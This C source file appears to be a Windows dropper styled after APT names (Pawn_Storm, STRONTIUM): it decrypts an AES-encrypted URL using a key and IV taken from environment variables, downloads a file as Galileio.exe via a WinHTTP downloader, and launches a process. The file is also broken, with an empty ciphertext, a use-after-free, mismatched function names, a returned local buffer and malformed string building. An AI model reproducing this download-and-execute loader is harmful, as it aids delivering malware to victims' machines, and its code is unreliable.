#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <locale.h>
#include <winhttp.h>
#include <windows.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#include "convenince.h"

/*
Pawn_Storm is the function exposed for STRONTIUM also runs Galilieo 
Voltzite will be used in every C program that needs an AES dcrypt so Sam, Group123, and Black_Vine will not be explaind in any other func discriptions because you can just refrence STRONTIUM
fillin gets the path of this file
varda downloader

*/

Icarus_API void Pawn_Storm(){
    char * txt= "";
    char *varstr1= Voltzite(txt);
    setlocale(LC_ALL, ""); // Ensure proper wide-char handling

    char* str1 = varstr1;
    free(varstr1);
    char * str3 = fillin();
    char* str2 = "%s\\Galileio.exe", str3;

    // Step 1: Compute length for wide strings
    size_t len1 = mbstowcs(NULL, str1, 0); // Convert to wide char length
    size_t len2 = mbstowcs(NULL, str2, 0);

    // Step 2: Allocate memory for concatenated wide string
    wchar_t* wstr = malloc((len1 + len2 + 1) * sizeof(wchar_t));
    if (!wstr) return 1;

    // Step 3: Convert first string
    mbstowcs(wstr, str1, len1 + 1);

    // Step 4: Convert second string and concatenate
    mbstowcs(wstr + len1, str2, len2 + 1);


    varda(3, wstr);

    free(wstr);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Path to your executable
    const char* exePath = str3;

    // Start the process
    CreateProcessA(
        exePath,   // Application name
        NULL,      // Command line arguments
        NULL,      // Process handle not inheritable
        NULL,      // Thread handle not inheritable
        FALSE,     // Set handle inheritance to FALSE
        0,         // No creation flags
        NULL,      // Use parent's environment block
        NULL,      // Use parent's starting directory 
        &si,       // Pointer to STARTUPINFO structure
        &pi
    );       // Pointer to PROCESS_INFORMATION structure
    

    // Wait until the process exits
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

}



char * Voltzite(const unsigned char* cipherText){
    unsigned char key[32];
    unsigned char iv[16];
    Group123(iv);
    Black_Vine(key);

    return sam(cipherText, sizeof(cipherText), key, sizeof(key), iv, sizeof(iv));
}

void Group123(unsigned char out[16]){
    unsigned char buffer[MAX_PATH] = {0};
    DWORD len = GetEnvironmentVariableA("windir", (char*)buffer, sizeof(buffer));

    // Fill output with zeros first
    for (int i = 0; i < 16; i++)
        out[i] = 0x00;

    if (len == 0 || len >= sizeof(buffer))
        return;

    size_t n = (len < 16) ? len : 16;
    for (size_t i = 0; i < n; i++)
        out[i] = buffer[i];
}

void Black_Vine(unsigned char out[32]){

    unsigned char buffer[MAX_PATH] = {0};
    DWORD len = GetEnvironmentVariableA("COMSPEC", (char*)buffer, sizeof(buffer));

    // Fill output with zeros first
    for (int i = 0; i < 32; i++)
        out[i] = 0x00;

    if (len == 0 || len >= sizeof(buffer))
        return;

    size_t n = (len < 32) ? len : 32;
    for (size_t i = 0; i < n; i++)
        out[i] = buffer[i];
}

char* Sam(const unsigned char* cipherText, int cipherTextLen, const unsigned char* Key, int KeyLen, const unsigned char* IV, int IVLen) {
    if (cipherText == NULL || cipherTextLen <= 0) {
        return NULL;
    }
    if (Key == NULL || KeyLen <= 0) {
        return NULL;
    }
    if (IV == NULL || IVLen <= 0) {
        return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        return NULL;
    }

    // Initialize decryption operation with AES CBC mode
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, Key, IV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    unsigned char* plaintext = malloc(cipherTextLen + AES_BLOCK_SIZE);
    if (!plaintext) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    int len = 0;
    int plaintext_len = 0;

    if (EVP_DecryptUpdate(ctx, plaintext, &len, cipherText, cipherTextLen) != 1) {
        free(plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    plaintext_len = len;

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        free(plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    // Null-terminate the plaintext string
    plaintext[plaintext_len] = '\0';

    return (char*)plaintext;
}

char *fillin(){

    char path[MAX_PATH];
    
    // Get the full path of the executable
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
    }

    // Remove the executable name to get the directory
    char* lastSlash = strrchr(path, '\\');
    if (lastSlash) {
        *lastSlash = '\0'; // terminate the string at the last backslash
    }
    return path;
}



int varda(int argc, wchar_t *argv[]){

    if (argc != 3)
    {
        wprintf(L"Usage: %s <URL> <output file>\n", argv[0]);
        return 1;
    }

    wchar_t *url = argv[1];       // Full URL e.g., https://example.com/file.zip
    wchar_t *output_file = argv[2];

    // Parse URL into components
    URL_COMPONENTS urlComp;
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t host[256];
    wchar_t path[1024];
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = _countof(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = _countof(path);

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp))
    {
        wprintf(L"Invalid URL.\n");
        return 1;
    }

    // Open session
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Downloader/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 1;

    // Connect
    INTERNET_PORT port = urlComp.nPort ? urlComp.nPort : INTERNET_DEFAULT_HTTPS_PORT;
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, port, 0);
    if (!hConnect) return 1;

    // Open request
    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            flags);
    if (!hRequest) return 1;

    // Send request
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL))
    {
        FILE *fp = _wfopen(output_file, L"wb");
        if (!fp) return 1;

        DWORD bytesAvailable = 0;
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0)
        {
            char *buffer = (char*)malloc(bytesAvailable);
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest, buffer, bytesAvailable, &bytesRead) && bytesRead > 0)
            {
                fwrite(buffer, 1, bytesRead, fp);
            }
            free(buffer);
        }

        fclose(fp);
    
    }
    else
    {
        
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}